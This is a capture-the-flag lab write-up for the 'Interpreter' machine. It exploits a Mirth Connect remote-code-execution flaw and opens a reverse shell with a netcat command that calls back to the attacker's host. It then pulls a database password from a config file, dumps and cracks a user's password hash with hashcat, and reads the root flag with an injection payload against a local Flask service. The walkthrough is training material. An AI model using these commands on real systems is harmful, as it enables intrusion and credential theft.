# Interpreter
## Enumeration
### Nmap
Nmap results:
```bash
Host is up (0.055s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp  open  http
443/tcp open  ssl/https
2 services unrecognized despite returning data.
```
Let's add `interpreter.htb` to our `/etc/hosts` and view the website.  
Upon entering the website we see that a `mirth connect` service is running.  
I checked `/api` as it's common in mirth connect.  
From the interactive api, we can check the version of `mirth connect`:  
`4.4.0`.  
## Exploitation
Searching google for `mirth connect exploit` brings us to [this](https://www.vicarius.io/vsociety/posts/rce-in-mirth-connect-pt-ii-cve-2023-43208)  
Let's check out the script.
```bash
python3 exploit.py -u https://interpreter.htb -c 'id'
The target appears to have executed the payload.
```
Now we can try to get a reverse shell, so first let's setup a listener
```bash
nc -lvnp 4444
```
Now let's run the exploit
```bash
python3 exploit.py -u https://interpreter.htb -c 'nc -c sh <YOUR IP> <YOUR PORT>'
The target appears to have executed the payload.
```
And we get a connection, so lets stabilize the shell
```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.2.26 37204
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
mirth@interpreter:/usr/local/mirthconnect$
```
Going to `/home` reveals a user `sedric`.  
We can check out the mirth files. The most interesting one is `/usr/local/mirthconnect/conf/mirth.properties`  
This exposes a mysql database with username `mirthdb` and password `MirthPass123!`, so let's connect.
```bash
mirth@interpreter:/usr/local/mirthconnect/conf$ mysql -u mirthdb -p -h 127.0.0.1 mc_bdd_prod
mysql -u mirthdb -p -h 127.0.0.1 mc_bdd_prod
Enter password: MirthPass123!
```
After looking around we find a user `sedric` and his hash.
```bash
MariaDB [mc_bdd_prod]> SELECT CONCAT(p.USERNAME, ':', pp.PASSWORD)
SELECT CONCAT(p.USERNAME, ':', pp.PASSWORD)
    -> FROM PERSON p
FROM PERSON p
    -> JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;
JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;
+-----------------------------------------------------------------+
| CONCAT(p.USERNAME, ':', pp.PASSWORD)                            |
+-----------------------------------------------------------------+
| sedric:u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== |
+-----------------------------------------------------------------+
```
Let's try and crack this hash.  
First we need to convert the hash to a correct format:
```bash
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p -c 256
bbff8b0413949da762c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
```
The first 8 bytes are the salt, and the rest are the key:
```bash
echo 'bbff8b0413949da7' | xxd -r -p | base64
u/+LBBOUnac=
```
And now the key:
```bash
echo '62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb' | xxd -r -p | base64
YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```
We can also check on the web, that `mirth connect` uses 60000 iterations for the hashes.  
Now let's put it in a crackable format for `hashcat`:  
`sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=`  
And run `hashcat`:
```bash
hashcat -m 10900 hash.txt rockyou.txt
```
After a couple of minutes, we get a hit: `sedric:snowflake1`.  
These credentials are both for SSH and the website, but let's SSH into the target and get user flag: `ssh sedric@interpreter.htb`.
## ROOT
After SSH'ing into the machine, we see that everything is very barebones. This machine doesn't even have `sudo`.  
After looking around for a bit, I came upon this;
```bash
sedric@interpreter:~$ ps aux | grep python
root        3516  0.0  0.6 400212 25904 ?        Ssl  05:02   0:02 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
root        3519  0.0  0.7  39872 31048 ?        Ss   05:02   0:01 /usr/bin/python3 /usr/local/bin/notif.py
```
We see an interesting script at `/usr/local/bin/notif.py`, so let's check it out: `cat /usr/local/bin/notif.py`.  
This script takes a `POST` request to `/addPatient` along with some data. The script is running `flask` templates, and as we all know, they are prone to injection. Getting root flag is as easy as picking the correct payload:
```bash
xml='<patient><firstname>{open("/root/root.txt").read()}</firstname><lastname>a</lastname><sender_app>a</sender_app><timestamp>a</timestamp><birth_date>01/01/2000</birth_date><gender>a</gender></patient>'; printf "POST /addPatient HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/xml\r\nContent-Length: %d\r\n\r\n%s" "$(echo -n "$xml" | wc -c)" "$xml" | nc 127.0.0.1 54321
```
And now we got root flag!
